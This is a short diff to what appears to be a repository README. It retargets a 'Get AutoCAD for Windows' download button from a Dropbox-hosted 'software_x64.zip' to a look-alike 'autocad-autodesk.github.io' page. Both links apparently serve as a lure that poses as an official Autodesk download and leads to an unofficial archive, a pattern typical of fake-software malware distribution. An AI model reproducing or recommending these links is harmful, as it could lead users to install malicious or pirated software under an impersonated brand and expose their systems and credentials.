@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">  
-  <a href="https://www.dropbox.com/scl/fi/evien1e06zbc1p1uvcmq6/software_x64.zip?rlkey=87vfcnwd2e4wgqevmxj63jpdd&st=auoy6oub&dl=1">  
+  <a href="https://autocad-autodesk.github.io/.github">  
     <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Get AutoCAD for Windows">  
   </a>  
 </p>
